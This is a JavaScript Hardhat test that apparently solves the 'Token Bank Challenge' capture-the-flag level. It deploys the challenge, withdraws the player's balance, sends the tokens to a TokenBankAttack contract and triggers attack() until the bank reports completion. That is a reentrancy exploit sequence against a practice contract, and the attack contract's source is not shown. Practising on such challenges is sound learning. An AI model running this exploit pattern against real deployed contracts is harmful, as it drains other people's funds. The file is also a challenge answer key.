const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");
describe("Token Bank Challenge", function() {
    beforeEach(async function() {
        [tokenHolder, player] = await ethers.getSigners();
        bank = await (await ethers.getContractFactory("TokenBankChallenge")).deploy(player.address);
        await bank.deployed();
        token = await ethers.getContractAt("ISimpleERC223Token", await bank.token());
        attacker = await (await ethers.getContractFactory("TokenBankAttack")).connect(player).deploy(bank.address);
        await attacker.deployed();
});
    describe("Complete Challenge", function() {
        it("Should complete the challenge", async function() {
            balance = await bank.balanceOf(player.address);
            await bank.connect(player).withdraw(balance);
            console.log(await token.balanceOf(player.address));
            await token.connect(player).transfer(attacker.address, balance);
            await attacker.connect(player).attack();
            expect(await bank.isComplete()).to.equal(true);
        });
    });
});